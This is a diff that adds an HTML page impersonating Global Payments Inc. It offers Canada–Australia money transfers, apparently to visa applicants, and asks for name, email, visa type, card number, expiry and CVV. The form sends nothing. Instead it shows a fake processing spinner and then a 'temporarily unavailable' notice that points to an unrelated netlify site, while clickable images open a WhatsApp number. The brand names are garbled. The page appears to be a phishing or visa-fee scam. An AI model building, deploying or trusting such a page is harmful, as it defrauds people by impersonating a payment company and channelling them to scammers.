@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Global Payments INC. integrated payments</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+<style>
+body{
+  font-family: Arial, Helvetica, sans-serif;
+  background:#eef2f6;
+  margin:0;
+  padding:0;
+}
+.header{
+  background:#0b3a6e;
+  color:#fff;
+  padding:16px;
+  display:flex;
+  align-items:center;
+  gap:15px;
+}
+.header img{
+  height:48px;
+  background:#fff;
+  padding:6px;
+  border-radius:6px;
+}
+.container{
+  max-width:1000px;
+  margin:25px auto;
+  background:#fff;
+  padding:20px;
+  border-radius:8px;
+  box-shadow:0 10px 30px rgba(0,0,0,.08);
+}
+h2,h3{margin-top:0;color:#0b3a6e}
+
+.bank-logos{
+  display:flex;
+  flex-wrap:wrap;
+  gap:15px;
+  margin:15px 0;
+}
+.bank{
+  border:2px solid #ddd;
+  border-radius:6px;
+  padding:12px 18px;
+  display:flex;
+  align-items:center;
+  gap:10px;
+  background:#fafafa;
+  cursor:pointer;
+  transition:.2s;
+}
+.bank:hover{
+  border-color:#0b3a6e;
+  background:#e8f1fb;
+}
+.bank.active{
+  border-color:#0b8f3d;
+  background:#e6f6ec;
+}
+.bank i{font-size:26px;color:#0b3a6e}
+
+.form-group{margin-bottom:15px; width: 100%;}
+label{display:block;font-weight:bold;margin-bottom:6px}
+input{
+  width:100%;
+  padding:12px;
+  border:1px solid #ccc;
+  border-radius:5px;
+  box-sizing: border-box;
+}
+
+.btn{
+  width:100%;
+  padding:14px;
+  font-size:18px;
+  background:#0b8f3d;
+  color:#fff;
+  border:none;
+  border-radius:6px;
+  cursor:pointer;
+  margin-top: 10px;
+}
+.btn:hover{background:#0a7c35}
+
+.loader{
+  display:none;
+  text-align:center;
+  margin-top:20px;
+}
+.loader i{
+  font-size:38px;
+  color:#0b3a6e;
+  animation:spin 1s linear infinite;
+}
+@keyframes spin{100%{transform:rotate(360deg)}}
+
+.notice{
+  margin-top:20px;
+  padding:15px;
+  background:#fff3cd;
+  border:1px solid #ffeeba;
+  border-radius:6px;
+  color:#856404;
+  display:none;
+}
+
+.img-full { width: 100%; height: auto; display: block; margin: 10px 0; border-radius: 5px;}
+.clickable { cursor: pointer; transition: 0.3s; }
+.clickable:hover { opacity: 0.8; }
+
+/* একদম নিচের ইমেজের জন্য স্পেশাল ডিজাইন */
+.full-screen-bottom {
+  width: 100%;
+  margin: 0;
+  padding: 0;
+  display: block;
+}
+.full-screen-bottom img {
+  width: 100%;
+  display: block;
+  border: none;
+  border-radius: 0;
+}
+
+.footer-credits {
+  background: #000;
+  color: #fff;
+  text-align: center;
+  padding: 20px 0;
+  font-size: 13px;
+}
+.footer-credits img {
+    width: 30px;
+    vertical-align: middle;
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <img src="https://uploads.onecompiler.io/44asn934w/44at8s5cp/1000201054.gif">
+  <div>
+    <strong>Global Payments requirements</strong><br>
+    Common Methods for Sending Money (CAD to AUD)
+  </div>
+</div>
+
+<marquee style="background: #fff; padding: 5px; border-bottom: 1px solid #ddd;">
+  Notification ❗: payments between Canada and Australia, you are (Currently) using an online international Money transfer service, Rules:📢 Send money quickly and easily, (🇨🇦 CAD or 🇦🇺 AUD) Specialized online services: (1) ACE Account, (2) Xe A/C, (3) Remittance, (4) Remitly, (5) OFX Pesa, and (6) Global Pay.
+</marquee>
+   
+<div class="container">
+  <h2>Payment Methods from Canada & Australia, Fund Transfer:</h2>
+  <p>Pay using your (EFT), debit card, credit card, or bank Transfer. Canadian & Australia,</p>
+  <img src="https://uploads.onecompiler.io/44db59mje/44dv2v2zx/1000208552.png" class="img-full">
+      
+  <div class="form-group" style="margin-top: 25px;">
+    <h2>Select Payment Method</h2>  
+    <h2><strong>🏦</strong> <span id="selectedPay">Select</span></h2>
+  <img src="https://uploads.onecompiler.io/44db59mje/44dkvz79d/1000208016.avif" class="img-full">
+    <div class="bank-logos">
+      <div class="bank" onclick="selectPay(this,'Visa Card')"><i class="fa fa-cc-visa"></i>Visa Card</div>
+      <div class="bank" onclick="selectPay(this,'Master Card')"><i class="fa fa-cc-mastercard"></i> Master Card</div>
+      <div class="bank" onclick="selectPay(this,'Amex Express')"><i class="fa fa-cc-amex"></i>Amex Express</div>
+      <div class="bank" onclick="selectPay(this,'Global Payment')"><i class="fa fa-university"></i>Global pay</div>
+      <div class="bank" onclick="selectPay(this,'ACE Payment')"><i class="fa fa-bank"></i>ACN Money</div>
+      <div class="bank" onclick="selectPay(this,'Wise payment')"><i class="fa fa-credit-card"></i>Wise Pay</div>
+    </div>
+  </div> 
+  <img src="https://uploads.onecompiler.io/44db59mje/44dkvz79d/1000208016.avif" class="img-full">
+      
+  <div class="form-section">
+    <h2>Employer Information</h2>
+
+    <div class="form-group">
+      <label>• Full Name</label>
+      <input type="text" placeholder="Full name">
+    </div>
+
+    <div class="form-group">
+      <label>• Email Address</label>
+      <input type="email" placeholder="example@email.com">
+    </div>
+
+    <div class="form-group">
+      <label>• Visa Types</label>
+      <input type="text" placeholder="Work-Visit-Study">
+    </div>
+
+    <h3 style="margin-top: 20px;">• Payment Information</h3>
+    <div class="form-group">
+      <label>Card Holder Name</label>
+      <input type="text" placeholder="Name on card">
+    </div>
+
+    <div class="form-group">
+      <label>• Card / Account Number</label>
+      <input type="text" placeholder="XXXX XXXX XXXX XXXX">
+    </div>
+
+    <div class="form-group">
+      <label>• Expiry / CVV</label>
+      <input type="text" placeholder="MM/YY - CVV">
+    </div>
+
+    <button class="btn" onclick="processPayment()">Pay Now</button>
+
+    <div class="loader" id="loader">
+      <i class="fa fa-spinner"></i>
+      <p>⏳ Processing payment, please wait…</p>
+    </div>
+  
+    <div class="notice" id="notice">
+      <strong>🚫 Payment Temporarily Unavailable</strong><br><br>
+      Payments from your current country are temporarily unavailable due to server issues.<br>
+      Please try again later or try
+      <a href="https://immigration-pay-global-vac.netlify.app/" style="color: #0b3a6e; font-weight: bold;">💱 again Now..</a>
+    </div>
+  </div>
+
+  <hr style="margin: 30px 0; border: 0; border-top: 1px solid #eee;">
+
+    <h3>Best payment gateways for international payments.</h3>
+  <img src="https://uploads.onecompiler.io/44db59mje/44dv2v2zx/1000208550.png" class="img-full clickable" onclick="window.open('https://wa.me/+16722844386','_blank')">
+    
+  <div class="form-group">
+    <h3>For payments between Canada and Australia, you are currently using an online international money transfer service.</h3>
+    <img src="https://uploads.onecompiler.io/445hxyxas/446t4t5gr/1000193144.png" class="img-full clickable" onclick="window.open('https://wa.me/+16722844386','_blank')">
+    <ul style="padding-left: 20px;">
+      <li>Rules: Send money quickly and easily, (CAD or AUD) Specialized online services:</li>
+      <li>ACE Account, Xe, Remittance, Remitly, OFX, Pesa, and Global Pay.</li>
+    </ul>
+    <p><a href="https://www.wsfxglobalpay.com/" style="color: #0b3a6e; font-weight: bold; text-decoration: none;">🏦 Click here for Quick and Easy Pay.</a></p>
+  </div>
+  
+    <div class="form-group">
+    <h3>For payments between Canada and Australia, you are currently using an online international money transfer service.</h3>
+    <img src="https://uploads.onecompiler.io/44db59mje/44dv2v2zx/1000208549.png" class="img-full clickable" onclick="window.open('https://wa.me/+16722844386','_blank')">
+    <ul style="padding-left: 20px;">
+      <li>Rules: Send money quickly and easily, (CAD or AUD) Specialized online services:</li>
+      <li>ACE Account, Xe, Remittance, Remitly, OFX, Pesa, and Global Pay.</li>
+    </ul>
+    <p><a href="https://www.wsfxglobalpay.com/" style="color: #0b3a6e; font-weight: bold; text-decoration: none;">🏦 Click here for Quick and Easy Pay.</a></p>
+  </div>
+         
+  <div class="form-group">
+    <h2>Recipient details to Canada Australia: </h2>
+    <p>Unified, global payments to grow your revenue</p>
+    <img src="https://uploads.onecompiler.io/44asn934w/44auhxdwe/1000201117.gif" class="img-full">
+    <p>These two accounts use a BSB (Bank, State, Branch) number, account number, and the bank's SWIFT/BIC code for international transfers.</p>
+  </div>
+</div>
+
+<!-- এখানে ইমেজগুলো কন্টেইনারের বাইরে রাখা হয়েছে যাতে ফুল স্ক্রিন পায় -->
+<div class="full-screen-bottom">
+    <img src="https://uploads.onecompiler.io/44asn934w/44auhxdwe/1000201131.jpg" alt="Footer Banner 1">
+    <img src="https://uploads.onecompiler.io/44asn934w/44auhxdwe/1000201128.jpg" alt="Footer Banner 2">
+</div>
+
+<div class="footer-credits">
+    <img src="https://uploads.onecompiler.io/44asn934w/44auhxdwe/1000201109.png">
+    <span>© 2026 Global Payments Inc. All rights reserved</span>
+</div>
+
+<script>
+function selectPay(el, name){
+  document.querySelectorAll('.bank').forEach(b=>b.classList.remove('active'));
+  el.classList.add('active');
+  document.getElementById("selectedPay").innerText = name;
+}
+
+function processPayment(){
+  document.getElementById("notice").style.display="none";
+  document.getElementById("loader").style.display="block";
+
+  setTimeout(()=>{
+    document.getElementById("loader").style.display="none";
+    document.getElementById("notice").style.display="block";
+  },2500);
+}
+</script>
+
+</body>
+</html>
